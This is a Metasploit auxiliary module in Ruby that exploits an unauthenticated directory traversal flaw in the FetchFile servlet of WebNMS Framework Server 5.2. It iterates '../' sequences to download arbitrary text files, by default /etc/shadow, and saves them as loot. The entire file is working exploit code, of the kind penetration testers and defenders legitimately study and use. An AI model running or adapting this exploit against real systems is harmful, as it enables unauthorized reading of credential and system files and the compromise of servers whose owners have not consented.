##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'WebNMS Framework Server Arbitrary Text File Download',
      'Description' => %q{
This module abuses a vulnerability in WebNMS Framework Server 5.2 that allows an
unauthenticated user to download files off the file system by using a directory
traversal attack on the FetchFile servlet.
Note that only text files can be downloaded properly, as any binary file will get
mangled by the servlet. Also note that for Windows targets you can only download
files that are in the same drive as the WebNMS installation.
This module has been tested with WebNMS Framework Server 5.2 and 5.2 SP1 on
Windows and Linux.
},
      'Author' =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          [ 'URL', 'https://blogs.securiteam.com/index.php/archives/2712' ]
        ],
      'DisclosureDate' => 'Jul 4 2016'))

    register_options(
      [
        OptPort.new('RPORT', [true, 'The target port', 9090]),
        OptString.new('TARGETURI', [ true,  "WebNMS path", '/']),
        OptString.new('FILEPATH', [ false,  "The filepath of the file you want to download", '/etc/shadow']),
        OptString.new('TRAVERSAL_PATH', [ false,  "The traversal path to the target file (if you know it)"]),
        OptInt.new('MAX_TRAVERSAL', [ false,  "Maximum traversal path depth (if you don't know the traversal path)", 10]),
      ], self.class)
  end


  def run
    file = nil
    if datastore['TRAVERSAL_PATH'] == nil
      traversal_size = datastore['MAX_TRAVERSAL']
      while traversal_size > 0
        file = get_file("../" * traversal_size + datastore['FILEPATH'])
        if file != nil
          break
        end
        traversal_size -= 1
      end
    else
      file = get_file(datastore['TRAVERSAL_PATH'])
    end

    if file == nil
      print_error("#{peer} - Failed to download the specified file.")
      return
    else
      vprint_line(file)
      fname = File.basename(datastore['FILEPATH'])

      path = store_loot(
        'webnms.http',
        'text/plain',
        datastore['RHOST'],
        file,
        fname
      )
      print_good("File download successful, file saved in #{path}")
    end
  end


  def get_file(path)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'servlets', 'FetchFile'),
      'method' =>'GET',
      'vars_get' => { 'fileName' => path }
    })
    if res && res.code == 200 && res.body.to_s.length > 0 && res.body.to_s =~ /File Found/
      return res.body.to_s
    else
      return nil
    end
  end
end
